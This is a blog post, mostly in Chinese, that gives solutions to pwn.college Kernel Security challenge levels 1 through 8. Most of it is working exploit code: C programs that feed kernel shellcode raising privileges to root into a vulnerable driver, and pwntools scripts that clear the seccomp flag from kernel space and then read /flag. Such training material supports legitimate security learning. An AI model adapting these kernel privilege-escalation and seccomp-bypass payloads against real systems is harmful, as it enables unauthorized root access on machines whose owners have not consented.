---
title: pwn.college Kernel Security
date: 2024-07-15 15:44:34
tags: [pwn.college, Kernel]
categories: 
    - pwn.college
    - Kernel Security
---


# 前言

每个题的驱动都是跑在qemu虚拟机的，开启题目后需要`vm connect`连上qemu，此时`lsmod`就可以看见安装好的驱动

# level1.0
```Shell
echo pwvrvqitxoodqbxa > /proc/pwncollege | head /proc/pwncollege
```

# level1.1
```Shell
echo ufyqfbjmxahuzqzi > /proc/pwncollege | head /proc/pwncollege
```

# level2.0
```Shell
echo clxyrfcckjpuexis > /proc/pwncollege | dmesg
```

# level2.1
```Shell
echo ccvqignnvespgtyp > /proc/pwncollege | dmesg
```

# level3.0
```Shell
echo xpmylzhkfevejscw > /proc/pwncollege | cat /flag
```

# level3.1
```Shell
echo gwcifabytyzfdpjo > /proc/pwncollege | cat /flag
```

# level4.0
```C
#include <stdio.h>
#include <fcntl.h>

int main() {
    int fd=open("/proc/pwncollege",O_RDWR);
    ioctl(fd,1337,"emrbpgldsrexybrh");
    system("/bin/sh");
    return 0;
}
```

# level4.1
```C
#include <stdio.h>
#include <fcntl.h>

int main() {
    int fd=open("/proc/pwncollege",O_RDWR);
    ioctl(fd,1337,"gixhsazzowbivqrw");
    system("/bin/sh");
    return 0;
}
```

# level5.0
```C
#include <stdio.h>
#include <sys/ioctl.h>
#include <fcntl.h>

int main() {
  long win = 0xffffffffc00004cd;
  int fd = open("/proc/pwncollege", O_WRONLY);
  ioctl(fd, 1337, win);
  system("id");
  system("cat /flag");
  system("/bin/sh");
  return 0;
}
```

# level5.1
```C
#include <stdio.h>
#include <sys/ioctl.h>
#include <fcntl.h>

int main() {
  long win = 0xffffffffc0000752;
  int fd = open("/proc/pwncollege", O_WRONLY);
  ioctl(fd, 1337, win);
  system("id");
  system("cat /flag");
  system("/bin/sh");
  return 0;
}
```

# level6.0
```C
#include <stdio.h>
#include <sys/ioctl.h>
#include <fcntl.h>

int main() {
  char shellcode[] = "H\xc7\xc7\x00\x00\x00\x00H\xc7\xc0\xd0\x90\x08\x81\xff\xd0H\x89\xc7H\xc7\xc0\x90\x8d\x08\x81\xff\xd0\xc3";
  int fd = open("/proc/pwncollege", O_WRONLY);
  write(fd,shellcode,sizeof(shellcode));
  system("id");
  system("cat /flag");
  system("/bin/sh");
  return 0;
}
```

# level6.1
```C
#include <stdio.h>
#include <sys/ioctl.h>
#include <fcntl.h>

int main() {
  char shellcode[] = "H\xc7\xc7\x00\x00\x00\x00H\xc7\xc0\xd0\x90\x08\x81\xff\xd0H\x89\xc7H\xc7\xc0\x90\x8d\x08\x81\xff\xd0\xc3";
  int fd = open("/proc/pwncollege", O_WRONLY);
  write(fd,shellcode,sizeof(shellcode));
  system("id");
  system("cat /flag");
  system("/bin/sh");
  return 0;
}
```


# level7.0
```C
#include <stdio.h>
#include <sys/ioctl.h>
#include <fcntl.h>

struct buf{
  long size;
  char shellcode[4096];
  long call_addr;
};

int main() {
  char shellcode[] = "H\xc7\xc7\x00\x00\x00\x00H\xc7\xc0\xd0\x90\x08\x81\xff\xd0H\x89\xc7H\xc7\xc0\x90\x8d\x08\x81\xff\xd0\xc3";
  // char shellcode[] = "H\xc7\xc7\x00\x00\x00\x00H\xc7\xc0\xe0\x95\x08\x81\xff\xd0H\x89\xc7H\xc7\xc0\xc0\x92\x08\x81\xff\xd0\xc3";
  struct buf A;
  int fd = open("/proc/pwncollege", O_WRONLY);
  A.size=4096;
  memcpy(A.shellcode,shellcode,sizeof(shellcode));
  // A.call_addr=0xffffc90000045000;//local
  A.call_addr=0xffffc90000085000;//remote
  ioctl(fd, 1337, &A);
  system("id");
  system("cat /flag");
  system("/bin/sh");
  return 0;
}
```

# level7.1
```C
#include <stdio.h>
#include <sys/ioctl.h>
#include <fcntl.h>

struct buf{
  long size;
  char shellcode[4096];
  long call_addr;
};

int main() {
  char shellcode[] = "H\xc7\xc7\x00\x00\x00\x00H\xc7\xc0\xd0\x90\x08\x81\xff\xd0H\x89\xc7H\xc7\xc0\x90\x8d\x08\x81\xff\xd0\xc3";
  // char shellcode[] = "H\xc7\xc7\x00\x00\x00\x00H\xc7\xc0\xe0\x95\x08\x81\xff\xd0H\x89\xc7H\xc7\xc0\xc0\x92\x08\x81\xff\xd0\xc3";
  struct buf A;
  int fd = open("/proc/pwncollege", O_WRONLY);
  A.size=4096;
  memcpy(A.shellcode,shellcode,sizeof(shellcode));
  // A.call_addr=0xffffc90000045000;//local
  A.call_addr=0xffffc90000085000;//remote
  ioctl(fd, 1337, &A);
  system("id");
  system("cat /flag");
  system("/bin/sh");
  return 0;
}
```


# level8.0
这个卡了两天0.0，需要注意下面几个点：
- /proc/challenge只有root用户才有RW权限
- /challenge下出了babykernel_level8.1.ko还有带SUID的ELF程序babykernel_level8.1
- babykernel_level8.1可以执行任意shellcode，但是seccomp禁用了除了write外的所有系统调用；babykernel_level8.1.ko的write可以接收用户空间的shellcode以执行
- 因为babykernel_level8.1有SUID所有可以读写/proc/challenge
- 思路就是通过babykernel_level8.1向/proc/challenge写入shellcode在内核空间中关闭seccomp，然后在用户空间ORW读取flag
- 注意通过current_task_struct->thread_info.flags关闭seccomp只能作用于该进程，通过system('/bin/sh')获取的shell是子进程，seccomp仍然生效

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/challenge/babykernel_level8.1')
context.terminal = ['tmux', 'splitw', '-h']
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()
# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)
rdi=0x0000000000402273
sc=b'j\x03_j-Z\xbe\xa0p31j\x01X\x0f\x05H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8.gm`f\x01\x01\x01H1\x04$H\x89\xe71\xd21\xf6j\x02X\x0f\x051\xc0j\x04_jPZ\xbe\x01\x01\x01\x01\x81\xf6\x01s20\x0f\x05j\x01_jPZ\xbe\x01\x01\x01\x01\x81\xf6\x01s20j\x01X\x0f\x05'
sc=sc.ljust(0xa0,b'\x90')
sc+=b'eH\x8b\x1c%\x00]\x01\x00H\x81#\xff\xfe\xff\xff\xc3\x00'
# sc+=b'eH\x8b\x1c%\x00]\x01\x00H\x81#\xff\xfe\xff\xffH\xc7\xc7\x00\x00\x00\x00H\xc7\xc0\xd0\x90\x08\x81\xff\xd0H\x89\xc7H\xc7\xc0\x90\x8d\x08\x81\xff\xd0\xc3\x00'

io.sendline(sc)
# io.sendline("cat /flag")
io.interactive()

```

# level8.1

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/challenge/babykernel_level8.1')
context.terminal = ['tmux', 'splitw', '-h']
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()
# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)
rdi=0x0000000000402273
sc=b'j\x03_j-Z\xbe\xa0p31j\x01X\x0f\x05H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8.gm`f\x01\x01\x01H1\x04$H\x89\xe71\xd21\xf6j\x02X\x0f\x051\xc0j\x04_jPZ\xbe\x01\x01\x01\x01\x81\xf6\x01s20\x0f\x05j\x01_jPZ\xbe\x01\x01\x01\x01\x81\xf6\x01s20j\x01X\x0f\x05'
sc=sc.ljust(0xa0,b'\x90')
sc+=b'eH\x8b\x1c%\x00]\x01\x00H\x81#\xff\xfe\xff\xff\xc3\x00'
# sc+=b'eH\x8b\x1c%\x00]\x01\x00H\x81#\xff\xfe\xff\xffH\xc7\xc7\x00\x00\x00\x00H\xc7\xc0\xd0\x90\x08\x81\xff\xd0H\x89\xc7H\xc7\xc0\x90\x8d\x08\x81\xff\xd0\xc3\x00'

io.sendline(sc)
# io.sendline("cat /flag")
io.interactive()

```

# level9.0

# level9.1